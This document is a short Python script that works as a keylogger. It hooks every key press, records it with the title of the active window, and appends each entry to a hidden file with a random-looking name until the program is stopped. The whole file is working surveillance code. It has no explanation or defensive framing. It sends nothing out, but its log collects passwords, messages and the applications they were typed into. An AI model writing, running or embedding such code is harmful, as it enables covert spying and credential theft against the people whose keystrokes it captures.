import keyboard
import pygetwindow as gw


FILE_PATH = '.L3EgQar.txt'

def on_key_event(event):
    key = event.name
    active_window = gw.getActiveWindowTitle()
    with open(FILE_PATH, 'a') as file:
        file.write(f'm,{key} - {active_window}.\n')

keyboard.on_press(on_key_event)

try:
    keyboard.wait()
except KeyboardInterrupt:
    print("Program stopped.")
finally:
    keyboard.unhook_all()

